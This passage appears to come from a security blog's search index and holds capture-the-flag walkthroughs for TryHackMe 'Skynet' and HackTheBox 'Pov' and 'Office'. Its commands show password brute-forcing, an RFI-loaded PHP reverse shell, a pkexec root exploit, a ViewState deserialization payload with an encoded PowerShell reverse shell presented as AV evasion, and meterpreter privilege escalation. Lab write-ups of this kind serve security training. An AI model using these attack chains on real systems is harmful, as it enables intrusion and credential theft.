0 Thu Nov 26 21:34:00 2020 .. D 0 Tue Sep 17 12:50:17 2019 attention.txt N 163 Wed Sep 18 08:34:59 2019 logs D 0 Wed Sep 18 10:12:16 2019\t\t9204224 blocks of size 1024. 5831512 blocks availablesmb: \\> get attention.txt getting file \\attention.txt of size 163 as attention.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)smb: \\> cd logssmb: \\logs\\> ls . D 0 Wed Sep 18 10:12:16 2019 .. D 0 Thu Nov 26 21:34:00 2020 log2.txt N 0 Wed Sep 18 10:12:13 2019 log1.txt N 471 Wed Sep 18 10:11:59 2019 log3.txt N 0 Wed Sep 18 10:12:16 2019\t\t9204224 blocks of size 1024. 5831512 blocks availablesmb: \\logs\\> smb: \\logs\\> get log1.txt getting file \\logs\\log1.txt of size 471 as log1.txt (0.6 KiloBytes/sec) (average 0.3 KiloBytes/sec)smb: \\logs\\> exit```{: .nolineno}Lets see what I got from this share â¬```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/SkyNet]â””â”€$ cat attention.txt A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.-Miles Dysonâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/SkyNet]â””â”€$ cat log1.txt cyborg007haloterminatorterminator22596terminator219terminator20terminator1989terminator1988terminator168terminator16terminator143terminator13terminator123!@#terminator1056terminator101terminator10terminator02terminator00......```{: .nolineno}## Web Enumeration â¤µï¸I checked port 80 and got this static site â¬![Image](Pasted%20image%2020240411170246.png)_Front Page_I did some digging into the web service and did directory listing into it and found some directories like this â¬```bashferoxbuster -u http://10.10.117.241/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 100 --depth 1 -C 403,404,503,502 -x txt,php,zip```{: .nolineno}![Image](Pasted%20image%2020240411160407.png)_Feroxbuster Tool_I checked `http://10.10.117.241/squirrelmail/` URL and found a login page â¬![Image](Pasted%20image%2020240411160626.png)_Squirrel Mail Login page_I think I need to Brute-force the username and password section with username as mailsdyson and password as we got from SMB shares that is `log1.txt` file.And for this I used Burpsuite Tool â¬![Image](Pasted%20image%2020240411161155.png)_Burpsuite Tool_I tired this credentials and got in ðŸ”»![Image](Pasted%20image%2020240411161320.png)_Squirrel Mail dashboard_![Image](Pasted%20image%2020240411161419.png)_Password got for SMB service of user milesdyson_Lets access its shares with smbclient Tool again ðŸ”½```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/SkyNet]â””â”€$ smbclient //10.10.117.241/milesdyson -U milesdysonPassword for [WORKGROUP\\milesdyson]:Try \"help\" to get a list of possible commands.smb: \\> ls . D 0 Tue Sep 17 14:35:47 2019 .. D 0 Wed Sep 18 09:21:03 2019 Improving Deep Neural Networks.pdf N 5743095 Tue Sep 17 14:35:14 2019 Natural Language Processing-Building Sequence Models.pdf N 12927230 Tue Sep 17 14:35:14 2019 Convolutional Neural Networks-CNN.pdf N 19655446 Tue Sep 17 14:35:14 2019 notes D 0 Tue Sep 17 14:48:40 2019 Neural Networks and Deep Learning.pdf N 4304586 Tue Sep 17 14:35:14 2019 Structuring your Machine Learning Project.pdf N 3531427 Tue Sep 17 14:35:14 2019\t\t9204224 blocks of size 1024. 5794628 blocks availablesmb: \\> cd notessmb: \\notes\\> ls . D 0 Tue Sep 17 14:48:40 2019 .. D 0 Tue Sep 17 14:35:47 2019 3.01 Search.md N 65601 Tue Sep 17 14:31:29 2019 4.01 Agent-Based Models.md N 5683 Tue Sep 17 14:31:29 2019 2.08 In Practice.md N 7949 Tue Sep 17 14:31:29 2019 0.00 Cover.md N 3114 Tue Sep 17 14:31:29 2019 1.02 Linear Algebra.md N 70314 Tue Sep 17 14:31:29 2019 important.txt N 117 Tue Sep 17 14:48:39 2019 6.01 pandas.md N 9221 Tue Sep 17 14:31:29 2019 3.00 Artificial Intelligence.md N 33 Tue Sep 17 14:31:29 2019 2.01 Overview.md N 1165 Tue Sep 17 14:31:29 2019 3.02 Planning.md N 71657 Tue Sep 17 14:31:29 2019 1.04 Probability.md N 62712 Tue Sep 17 14:31:29 2019 2.06 Natural Language Processing.md N 82633 Tue Sep 17 14:31:29 2019 2.00 Machine Learning.md N 26 Tue Sep 17 14:31:29 2019 1.03 Calculus.md N 40779 Tue Sep 17 14:31:29 2019 3.03 Reinforcement Learning.md N 25119 Tue Sep 17 14:31:29 2019 1.08 Probabilistic Graphical Models.md N 81655 Tue Sep 17 14:31:29 2019 1.06 Bayesian Statistics.md N 39554 Tue Sep 17 14:31:29 2019 6.00 Appendices.md N 20 Tue Sep 17 14:31:29 2019 1.01 Functions.md N 7627 Tue Sep 17 14:31:29 2019 2.03 Neural Nets.md N 144726 Tue Sep 17 14:31:29 2019 2.04 Model Selection.md N 33383 Tue Sep 17 14:31:29 2019 2.02 Supervised Learning.md N 94287 Tue Sep 17 14:31:29 2019 4.00 Simulation.md N 20 Tue Sep 17 14:31:29 2019 3.05 In Practice.md N 1123 Tue Sep 17 14:31:29 2019 1.07 Graphs.md N 5110 Tue Sep 17 14:31:29 2019 2.07 Unsupervised Learning.md N 21579 Tue Sep 17 14:31:29 2019 2.05 Bayesian Learning.md N 39443 Tue Sep 17 14:31:29 2019 5.03 Anonymization.md N 2516 Tue Sep 17 14:31:29 2019 5.01 Process.md N 5788 Tue Sep 17 14:31:29 2019 1.09 Optimization.md N 25823 Tue Sep 17 14:31:29 2019 1.05 Statistics.md N 64291 Tue Sep 17 14:31:29 2019 5.02 Visualization.md N 940 Tue Sep 17 14:31:29 2019 5.00 In Practice.md N 21 Tue Sep 17 14:31:29 2019 4.02 Nonlinear Dynamics.md N 44601 Tue Sep 17 14:31:29 2019 1.10 Algorithms.md N 28790 Tue Sep 17 14:31:29 2019 3.04 Filtering.md N 13360 Tue Sep 17 14:31:29 2019 1.00 Foundations.md N 22 Tue Sep 17 14:31:29 2019\t\t9204224 blocks of size 1024. 5794628 blocks availablesmb: \\notes\\> get important.txtgetting file \\notes\\important.txt of size 117 as important.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)smb: \\notes\\>```{: .nolineno}I accessed the important.txt file from the share and here is what it is â¬![Image](Pasted%20image%2020240411161816.png)_important.txt file_Seams like this is a hidden directory lets access it â¬![Image](Pasted%20image%2020240411161929.png)_Hidden Directory Page_I started directory or files bruteforcing on this directory and found `/administrator` page that indicates a cuppa CMS .![Image](Pasted%20image%2020240411155549.png)_Feroxbuster Scan result_![Image](Pasted%20image%2020240411162111.png)_Cuppa CMS Login Page_I recon further on this CMS page about its vulnerability and I got this â©https://www.exploit-db.com/exploits/25971 .I tired it and got LFI through directory traversal by accessing `/etc/passwd` content â¬`http://10.10.166.102/45........./administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd`![Image](Pasted%20image%2020240411162418.png)_/etc/passwd content access through LFI_Now lets try RFI with a simple reverse shell file from pentestmonkey â¬`http://10.10.166.102/45........../administrator/alerts/alertConfigField.php?urlConfig=http://10.11.75.200/php_reverse_shell.php`![Image](Pasted%20image%2020240411162942.png)_RFI method used here as the file got downloaded on the machine and executed as a result I got the reverse shell_I checked SUIDs binaries and got this â¬```bashwww-data@skynet:/$ find / -perm -u=s -type f 2>/dev/nullfind / -perm -u=s -type f 2>/dev/null/sbin/mount.cifs/bin/mount/bin/fusermount/bin/umount/bin/ping/bin/su/bin/ping6/usr/bin/passwd/usr/bin/sudo/usr/bin/newgrp/usr/bin/gpasswd/usr/bin/pkexec/usr/bin/chsh/usr/bin/newgidmap/usr/bin/at/usr/bin/newuidmap/usr/bin/chfn/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/eject/dmcrypt-get-device/usr/lib/snapd/snap-confine/usr/lib/openssh/ssh-keysignwww-data@skynet:/$```{: .nolineno}I found pkexec suspicious so I checked its version along with availability of python3 Tool .```bashwww-data@skynet:/$ /usr/bin/pkexec --version/usr/bin/pkexec --versionpkexec version 0.105www-data@skynet:/$ which python3which python3/usr/bin/python3www-data@skynet:/$```{: .nolineno}Since this version of pkexec is vulnerable so lets upload an [exploit](https://github.com/Almorabea/pkexec-exploit) for that I can get root access â¬```bashwww-data@skynet:/$ cd /tmpcd /tmpwww-data@skynet:/tmp$ wget http://10.11.75.200/pkexec_CVE-2021-4034.pywget http://10.11.75.200/pkexec_CVE-2021-4034.py--2024-04-11 06:06:12-- http://10.11.75.200/pkexec_CVE-2021-4034.pyConnecting to 10.11.75.200:80... connected.HTTP request sent, awaiting response... 200 OKLength: 3067 (3.0K) [text/x-python]Saving to: 'pkexec_CVE-2021-4034.py'pkexec_CVE-2021-403 100%[===================>] 3.00K --.-KB/s in 0s 2024-04-11 06:06:12 (340 MB/s) - 'pkexec_CVE-2021-4034.py' saved [3067/3067]www-data@skynet:/tmp$ chmod +x pk\tchmod +x pkexec_CVE-2021-4034.py www-data@skynet:/tmp$ python3 pkexec_CVE-2021-4034.pypython3 pkexec_CVE-2021-4034.pyDo you want to choose a custom payload? y/n (n use default payload) nn[+] Cleaning pervious exploiting attempt (if exist)[+] Creating shared library for exploit code.[+] Finding a libc library to call execve[+] Found a library at [+] Call execve() with chosen payload[+] Enjoy your root shell# whoamiwhoamiroot# cd /rootcd /root# /bin/bash -i/bin/bash -iroot@skynet:/root# ls -alls -altotal 28drwx------ 4 root root 4096 Sep 17 2019 .drwxr-xr-x 23 root root 4096 Sep 18 2019 ..lrwxrwxrwx 1 root root 9 Sep 17 2019 .bash_history -> /dev/null-rw-r--r-- 1 root root 3106 Oct 22 2015 .bashrcdrwx------ 2 root root 4096 Sep 17 2019 .cachedrwxr-xr-x 2 root root 4096 Sep 17 2019 .nano-rw-r--r-- 1 root root 148 Aug 17 2015 .profile-rw-r--r-- 1 root root 33 Sep 17 2019 root.txtroot@skynet:/root# cat root.txtcat root.txtFLAG_FLAG_FLAG_FLAG_FLAG_FLAGroot@skynet:/root#```{: .nolineno}I am root Now !! This was unintended way if you want to go intended way you need to check the cronjobs then . And then work accordingly !!___> If you have any questions or suggestions, please leave a comment below.> Thank You ! {: .prompt-tip }" }, { "title": "Pov", "url": "/posts/Pov/", "categories": "HackTheBox", "tags": "SeDebugPrivilege, ViewState, Deserialization, ysoserial, ASP_Net, PSCredential, PrivEsc, LFI", "date": "2024-04-27 00:00:00 +0530", "snippet": "| Machine Link | [https://app.hackthebox.com/machines/Pov](https://app.hackthebox.com/machines/Pov) || ------------------ | -------------------------------------------------------------------...", "content": "| Machine Link | [https://app.hackthebox.com/machines/Pov](https://app.hackthebox.com/machines/Pov) || ------------------ | ---------------------------------------------------------------------------------- || Operating System | Windows || Difficulty | Medium || Machine Created by | [d00msl4y3r](https://app.hackthebox.com/users/128944) |## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Pov]â””â”€$ sudo nmap -sC -sV -T4 -oN Nmap_Results.txt 10.10.11.251 -Pn[sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-15 09:10 ISTNmap scan report for 10.10.11.251Host is up (0.26s latency).Not shown: 999 filtered tcp ports (no-response)PORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0|_http-title: pov.htb|_http-server-header: Microsoft-IIS/10.0| http-methods: |_ Potentially risky methods: TRACEService Info: OS: Windows; CPE: cpe:/o:microsoft:windows```{: .nolineno}{: file='Nmap_Results.txt' .nolineno}## Web Enumeration â¤µï¸I checked port 80 and got this static page â¬![Image](Pasted%20image%2020240417080046.png)_Front Page_Then I set the hosts file as `pov.htb` and did some subdomain enumeration with [ffuf](https://github.com/ffuf/ffuf) Tool and got this result â¬```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Pov]â””â”€$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H \"Host: FUZZ.pov.htb\" -u http://pov.htb -fs 12330 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/' v2.1.0-dev________________________________________________ :: Method : GET :: URL : http://pov.htb :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt :: Header : Host: FUZZ.pov.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response size: 12330________________________________________________dev [Status: 302, Size: 152, Words: 9, Lines: 2, Duration: 221ms]web18721 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 5199ms]:: Progress: [19966/19966] :: Job [1/1] :: 203 req/sec :: Duration: [0:03:16] :: Errors: 0 ::```{: .nolineno}Lets look into `dev.pov.htb` subdomain and I got a portfolio site where I can download a `CV.pdf` file .![Image](Pasted%20image%2020240416153901.png)_subdomain page : http://dev.pov.htb/_I intercepted the request while downloading the pdf file to see some vulnerability in it and I thing there is a LFI in page of files parameter .![Image](Pasted%20image%2020240416155008.png)_cv.pdf request and response in burpsuite_Here is a LFI source â¬![Image](Pasted%20image%2020240416155307.png)_Through LFI I can access contact.aspx source code_While enumeration I also notice that : The highlighted part was ASP.NET so I searched online related to ASP.NET exploit and I got this site â¬![Image](Pasted%20image%2020240416154139.png)_Searched about ASP.NET exploit_This [URL](https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter) gave me some insight about ViewState.>**ViewState** serves as the default mechanism in ASP.NET to maintain page and control data across web pages. During the rendering of a page's HTML, the current state of the page and values to be preserved during a postback are serialized into base64-encoded strings. These strings are then placed in hidden ViewState fields.{: .prompt-tip }#### **Identifying ViewState Attributes**You can try to identify if ViewState is MAC protected by capturing a request containing this parameter with BurpSuite. If Mac is not used to protect the parameter you can exploit it using [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)Now to run ysoserial.exe file I need - Machine key- Validation KeyBoth values can be found inside web.config file .And Since this machine has LFI so lets access **web.config** file remotely.![Image](Pasted%20image%2020240416160118.png)_web.config content_I got the requirements and finally I need to run it but my Kali machine not able to execute the `.NET` applications , So I have to run this exploit into windows machine therefore I have taken help from docker and installed windows in my host machine since my host machine is also Ubuntu .Download this exploit from this [site](https://github.com/pwntester/ysoserial.net/releases/download/v1.36/ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9.zip) .For the payload part that will be executed , I will be using this powershell script that take cares of AV Detection or can say work like AV Evasion.```python#!/usr/bin/env python {payload.py}import base64import sysif len(sys.argv) &1 | Out-String ); $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> '); $s.Write($sb,0,$sb.Length); $s.Flush()};$c.Close()\"\"\" % (sys.argv[1], sys.argv[2])byte = payload.encode('utf-16-le')b64 = base64.b64encode(byte)print(\"powershell -exec bypass -enc %s\" % b64.decode())```{: .nolineno}Now If I ran this command â¤µï¸ ```bashpython3 payload.py ```{: .nolineno}I will get my payload like this â¬```bashpowershell -exec bypass -enc CgAkAGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnADEAMAAuADEAMAAuADEANAAuADMANgAnACwANAA0ADUAKQA7AAoAJABzACAAPQAgACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AAoAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAC4AUgBlAGEAZAAoACQAYgAsACAAMAAsACAAJABiAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewAKACAAIAAgACAAJABkACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIALAAwACwAIAAkAGkAKQA7AAoAIAAgACAAIAAkAHMAYgAgAD0AIAAoAGkAZQB4ACAAJABkACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7AAoAIAAgACAAIAAkAHMAYgAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBiACAAKwAgACcAcABzAD4AIAAnACkAOwAKACAAIAAgACAAJABzAC4AVwByAGkAdABlACgAJABzAGIALAAwACwAJABzAGIALgBMAGUAbgBnAHQAaAApADsACgAgACAAI............................CkACgB9ADsACgAkAGMALgBDAGwAbwBzAGUAKAApAAoA```{: .nolineno}Lets run our **ysoserial.exe** file now â­ï¸```bashysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"powershell -exec bypass -enc CgAkAGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnADEAMAAuADEAMAAuADEANAAuADMANgAnACwANAA0ADUAKQA7AAoAJABzACAAPQAgACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AAoAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAC4AUgBlAGEAZAAoACQAYgAsACAAMAAsACAAJABiAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewAKACAAIAAgACAAJABkACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIALAAwACwAIAAkAGkAKQA7AAoAIAAgACAAIAAkAHMAYgAgAD0AIAAoAGkAZQB4ACAAJABkACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7AAoAIAAgACAAIAAkAHMAYgAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBiACAAKwAgACcAcABzAD4AIAAnACkAOwAKACAAIAAgACAAJABzAC4AVwByAGkAdABlACgAJABzAGIALAAwACwAJABzAGIALgBMAGUAbgBnAHQAaAApADsACgAgACAAIAAgACQAcwAuAEYAbAB1AHMAaAAoACkACgB9ADsACgAkAGMALgBDAGwAbwBzAGUAKAApAAoA\" --path=\"/portfolio/default.aspx\" --apppath=\"/\" --decryptionalg=\"AES\" --decryptionkey=\"74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43\" --validationalg=\"SHA1\" --validationkey=\"5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468\"```{: .nolineno}I get a BASE64 encoded value , that will be put in `ViewState` parameter .![Image](Pasted%20image%2020240416161456.png)_Reverse Shell ViewState modified request_As a result to that I got a call back â¬![Image](Pasted%20image%2020240416161817.png)_Reverse Shell Call back_```powershellps> cd C:\\Users\\sfitzps> tree /f /aFolder PATH listingVolume serial number is 0899-6CAFC:.+---3D Objects+---Contacts+---Desktop +---Documents| connection.xml| +---Downloads+---Favorites| | Bing.url| | | \\---Links+---Links| Desktop.lnk| Downloads.lnk| +---Music+---Pictures+---Saved Games+---Searches\\---Videosps> type Documents\\Connection.xml System.Management.Automation.PSCredential System.Object System.Management.Automation.PSCredential alaading 01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92c............................................................................................447330113c5cfa25bc86fb0c6e1edda6 ps> ```{: .nolineno}Lets decode this PsCredential password with this command â¬```powershell$cred = Import-CliXml -Path connection.xml;$cred.GetNetworkCredential() | Format-List *```{: .nolineno}![Image](Pasted%20image%2020240416105735.png)Since I have a new user password so lets use runas Tool to run as this user **alaading** . And it did not work .I had to use [RunasCs.exe](https://github.com/antonioCoco/RunasCs) Tool to make it work .![Image](Pasted%20image%2020240417074329.png)_RunasCs Tool that invokes a reverse shell_```powershellC:\\Windows\\system32>cd C:\\Users\\alaadingcd C:\\Users\\alaadingC:\\Users\\alaading>tree /f /atree /f /aFolder PATH listingVolume serial number is 0899-6CAFC:.+---3D Objects+---Contacts+---Desktop| user.txt| +---Documents+---Downloads+---Favorites| | Bing.url| | | \\---Links+---Links| Desktop.lnk| Downloads.lnk| +---Music+---Pictures+---Saved Games+---Searches\\---VideosC:\\Users\\alaading>whoami /allwhoami /allUSER INFORMATION----------------User Name SID ============ ======================================pov\\alaading S-1-5-21-2506154456-4081221362-271687478-1001GROUP INFORMATION-----------------Group Name Type SID Attributes ==================================== ================ ============ ===========================================Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled groupBUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\INTERACTIVE Well-known group S-1-5-4 Mandatory group, Enabled by default, Enabled groupCONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\Local account Well-known group S-1-5-113 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled groupMandatory Label\\High Mandatory Level Label S-1-16-12288 PRIVILEGES INFORMATION----------------------Privilege Name Description State ============================= ============================== =SeDebugPrivilege Debug programs DisabledSeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set DisabledC:\\Users\\alaading>```{: .nolineno}I can se **SeDebugPrivilege** as Disable but I can try to exploit it some times Disabled privileges may also work.For this I need to have a metasploit session that will help me to find high privileged running processes and can also help me to migrate to it.- This tool requires your user to be a local admin or to haveÂ `SeDebugPrivilege`Â _(x86 only)_.- Prepare the meterpreter shell:```shellmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT=443 -f exe > shell.exe```{: .nolineno}- Copy to the target machine.- Listen to the reverse shell:```shellmsfconsole -quse exploit/multi/handlerset payload windows/x64/meterpreter/reverse_tcpset lhost set lport 443run```{: .nolineno}- Run shell:```batchfile.\\shell.exe```{: .nolineno}- Privesc using metasploit:```shelluse privgetsystem```{: .nolineno}or ```metasploitps```{: .nolineno}![Image](Pasted%20image%2020240417075639.png)```metasploitmeterpreter > migrate 560[*] Migrating from 3320 to 560...[*] Migration completed successfully.meterpreter > meterpreter > shellProcess 4300 created.Channel 1 created.Microsoft Windows [Version 10.0.17763.5329](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32>cd C:\\Users\\C:\\Users>cd Administratorcd AdministratorC:\\Users\\Administrator>tree /f /atree /f /aFolder PATH listingVolume serial number is 0899-6CAFC:.+---3D Objects+---Contacts+---Desktop| root.txt| +---Documents+---Downloads+---Favorites| | Bing.url| | | \\---Links+---Links| Desktop.lnk| Downloads.lnk| +---Music+---Pictures+---Saved Games+---Searches\\---VideosC:\\Users\\Administrator>```{: .nolineno}I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.> Thank You ! {: .prompt-tip }" }, { "title": "Office", "url": "/posts/Office/", "categories": "HackTheBox", "tags": "SharpGPOAbuse, Wireshark, keytab, Active Directory, Port Forwarding, Joomla, DPAPI, Public Exploit, File Upload, PrivEsc, CMS", "date": "2024-04-27 00:00:00 +0530", "snippet": "| Machine Link | [https://app.hackthebox.com/machines/Office](https://app.hackthebox.com/machines/Office) || ------------------ | -------------------------------------------------------------...", "content": "| Machine Link | [https://app.hackthebox.com/machines/Office](https://app.hackthebox.com/machines/Office) || ------------------ | ---------------------------------------------------------------------------------------- || Operating System | Windows (Active Directory) || Difficulty | Hard || Machine Created by | [0rii](https://app.hackthebox.com/users/169229) |## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Office]â””â”€$ sudo nmap -sC -sV -T4 -oN Nmap_Results.txt 10.10.11.3 -Pn [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-19 14:09 ISTNmap scan report for 10.10.11.3Host is up (0.26s latency).Not shown: 988 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain?80/tcp open http Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)|_http-generator: Joomla! - Open Source Content Management| http-robots.txt: 16 disallowed entries (15 shown)| /joomla/administrator/ /administrator/ /api/ /bin/ | /cache/ /cli/ /components/ /includes/ /installation/ |_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28|_http-title: Home88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-04-19 16:39:44Z)139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=DC.office.htb| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::, DNS:DC.office.htb| Not valid before: 2023-05-10T12:36:58|_Not valid after: 2024-05-09T12:36:58443/tcp open ssl/http Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)| tls-alpn: |_ http/1.1| ssl-cert: Subject: commonName=localhost| Not valid before: 2009-11-10T23:48:47|_Not valid after: 2019-11-08T23:48:47|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28|_ssl-date: TLS randomness does not represent time|_http-title: 403 Forbidden445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=DC.office.htb| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::, DNS:DC.office.htb| Not valid before: 2023-05-10T12:36:58|_Not valid after: 2024-05-09T12:36:58|_ssl-date: TLS randomness does not represent time3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=DC.office.htb| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::, DNS:DC.office.htb| Not valid before: 2023-05-10T12:36:58|_Not valid after: 2024-05-09T12:36:58|_ssl-date: TLS randomness does not represent time3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=DC.office.htb| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::, DNS:DC.office.htb| Not valid before: 2023-05-10T12:36:58|_Not valid after: 2024-05-09T12:36:58|_ssl-date: TLS randomness does not represent timeService Info: Hosts: DC, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: 7h59m58s| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required| smb2-time: | date: 2024-04-19T16:42:12|_ start_date: N/A```{: .nolineno}{: file='Nmap_Results.txt' .nolineno}## Web Enumeration â¤µï¸I checked port 80 and got this `Joomla CMS` hosted page .![Image](Pasted%20image%2020240421230953.png)Lets do some username enumeration through kerbrute Tool with a username wordlist â¬```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Office]â””â”€$ sudo /opt/Tools/kerbrute userenum -d office.htb --dc office.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt[sudo] password for kali: __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / , Using KDC(s):2024/04/19 14:36:01 > \toffice.htb:882024/04/19 14:36:47 > [+] VALID USERNAME:\t administrator@office.htb2024/04/19 14:41:52 > [+] VALID USERNAME:\t Administrator@office.htb2024/04/19 14:44:26 > [+] VALID USERNAME:\t etower@office.htb2024/04/19 14:44:26 > [+] VALID USERNAME:\t ewhite@office.htb2024/04/19 14:44:26 > [+] VALID USERNAME:\t dwolfe@office.htb2024/04/19 14:44:27 > [+] VALID USERNAME:\t dmichael@office.htb2024/04/19 14:44:28 > [+] VALID USERNAME:\t dlanor@office.htb```{: 